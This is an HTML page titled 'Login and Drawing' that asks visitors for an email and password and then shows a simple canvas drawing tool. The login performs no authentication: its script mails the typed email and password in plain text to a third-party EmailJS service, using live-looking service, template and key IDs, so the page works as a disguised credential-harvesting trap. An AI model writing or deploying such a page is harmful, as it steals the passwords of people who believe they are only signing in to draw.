<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login and Drawing</title>
  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; }
    #drawingCanvas { border: 2px solid black; cursor: crosshair; }
  </style>
</head>
<body>
  <h1>Login to Start Drawing</h1>
  <form id="loginForm">
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required><br><br>
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br><br>
    <button type="submit">Login</button>
  </form>

  <h1>Drawing Area</h1>
  <canvas id="drawingCanvas" width="800" height="600" style="display:none;"></canvas>
  <button id="clearButton" style="display:none;">Clear Canvas</button>

  <script>
    emailjs.init("Wm_hgPysMxjkcdYas");
    document.getElementById('loginForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('password').value;
      emailjs.send("service_zrgq0cs", "template_8r7y8vw", { email, password })
        .then(function(response) {
          console.log("Email sent successfully", response);
          document.querySelector('form').style.display = 'none';
          document.getElementById('drawingCanvas').style.display = 'block';
          document.getElementById('clearButton').style.display = 'block';
        }, function(error) {
          console.error("Failed to send email", error);
        });
    });

    const canvas = document.getElementById('drawingCanvas');
    const context = canvas.getContext('2d');
    let drawing = false;

    canvas.addEventListener('mousedown', () => drawing = true);
    canvas.addEventListener('mouseup', () => drawing = false);
    canvas.addEventListener('mousemove', (e) => {
      if (drawing) {
        context.lineTo(e.clientX - canvas.offsetLeft, e.clientY - canvas.offsetTop);
        context.stroke();
      }
    });

    document.getElementById('clearButton').addEventListener('click', function() {
      context.clearRect(0, 0, canvas.width, canvas.height);
    });
  </script>
</body>
</html>
